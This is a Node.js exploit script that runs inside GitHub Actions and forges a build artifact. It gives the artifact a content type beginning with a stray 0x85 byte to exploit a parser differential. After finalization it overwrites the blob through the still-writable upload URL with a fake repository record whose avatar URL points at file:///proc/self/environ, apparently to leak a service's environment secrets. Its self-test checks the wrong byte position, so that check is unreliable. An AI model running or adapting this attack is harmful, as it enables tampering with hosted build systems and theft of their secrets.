import { createHash } from 'node:crypto';

import { BlobClient } from '@azure/storage-blob';

const ARTIFACT_BYTES = 4096;

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function artifactContentType() {
  // Keep this as a one-byte V8 string. A literal "\u0085" is encoded as UTF-8 by
  // Node and does not trigger the target's parser differential.
  return Buffer.concat([
    Buffer.from([0x85]),
    Buffer.from('application/json', 'ascii'),
  ]).toString('latin1');
}

function makePayload(repository, artifactId) {
  const requestedRepository = `${repository}/actions/artifacts/${artifactId}/zip`;
  const document = {
    full_name: requestedRepository,
    owner: {
      login: 'cassette',
      avatar_url: 'file:///proc/self/environ',
    },
    description: 'Repo Cassette',
    stargazers_count: 0,
  };
  const json = Buffer.from(JSON.stringify(document), 'utf8');
  if (json.length > ARTIFACT_BYTES) {
    throw new Error(`Payload is ${json.length} bytes; fixed artifact is only ${ARTIFACT_BYTES}`);
  }
  return {
    bytes: Buffer.concat([json, Buffer.alloc(ARTIFACT_BYTES - json.length, 0x20)]),
    requestedRepository,
  };
}

async function artifactInternals() {
  const artifactEntry = import.meta.resolve('@actions/artifact');
  const artifactLib = new URL('.', artifactEntry);
  const [clientModule, utilModule, generatedModule] = await Promise.all([
    import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
    import(new URL('internal/shared/util.js', artifactLib)),
    import(new URL('generated/index.js', artifactLib)),
  ]);
  return {
    internalArtifactTwirpClient: clientModule.internalArtifactTwirpClient,
    getBackendIdsFromToken: utilModule.getBackendIdsFromToken,
    StringValue: generatedModule.StringValue,
  };
}

async function upload(blockBlob, bytes, contentType) {
  await blockBlob.uploadData(bytes, {
    blobHTTPHeaders: { blobContentType: contentType },
  });
}

async function main() {
  const repository = process.env.GITHUB_REPOSITORY;
  if (!repository || !/^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/.test(repository)) {
    throw new Error('Run this inside GitHub Actions so GITHUB_REPOSITORY is available');
  }
  if (!process.env.ACTIONS_RUNTIME_TOKEN || !process.env.ACTIONS_RESULTS_URL) {
    throw new Error('The GitHub Actions artifact runtime variables are unavailable');
  }

  const {
    internalArtifactTwirpClient,
    getBackendIdsFromToken,
    StringValue,
  } = await artifactInternals();
  const ids = getBackendIdsFromToken();
  const client = internalArtifactTwirpClient();
  const contentType = artifactContentType();
  const artifactName = `cassette-${process.env.GITHUB_RUN_ID || Date.now()}-${process.env.GITHUB_RUN_ATTEMPT || 1}.json`;

  const created = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name: artifactName,
    mimeType: StringValue.create({ value: contentType }),
    version: 6,
  });
  if (!created.ok || !created.signedUploadUrl) {
    throw new Error('CreateArtifact did not return a signed upload URL');
  }

  const blockBlob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
  const placeholder = Buffer.concat([
    Buffer.from('{}', 'ascii'),
    Buffer.alloc(ARTIFACT_BYTES - 2, 0x20),
  ]);
  await upload(blockBlob, placeholder, contentType);

  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name: artifactName,
    size: String(placeholder.length),
    hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
  });
  if (!finalized.ok || !/^\d+$/.test(finalized.artifactId)) {
    throw new Error('FinalizeArtifact did not return an artifact ID');
  }

  // The database ID only exists after finalization. The upload SAS remains writable,
  // so replace the same-size blob with the self-referential repository document.
  const payload = makePayload(repository, finalized.artifactId);
  await upload(blockBlob, payload.bytes, contentType);

  console.log('');
  console.log('Artifact forged successfully. Keep this workflow run and repository accessible.');
  console.log(`ARTIFACT_ID=${finalized.artifactId}`);
  console.log(`REPOSITORY=${payload.requestedRepository}`);
  console.log(`PAYLOAD_SHA256=${sha256(payload.bytes)}`);
  console.log(`::notice title=Minted v6 artifact::${finalized.artifactId}`);
}

if (process.argv.includes('--self-test')) {
  const contentType = artifactContentType();
  const payload = makePayload('owner/repository', '123456789');
  if (Buffer.from(contentType, 'latin1').at(-1) !== 0x85 || payload.bytes.length !== ARTIFACT_BYTES) {
    throw new Error('Self-test failed');
  }
  console.log(JSON.stringify({
    contentTypeLatin1Hex: Buffer.from(contentType, 'latin1').toString('hex'),
    payloadBytes: payload.bytes.length,
    requestedRepository: payload.requestedRepository,
  }));
} else {
  await main();
}
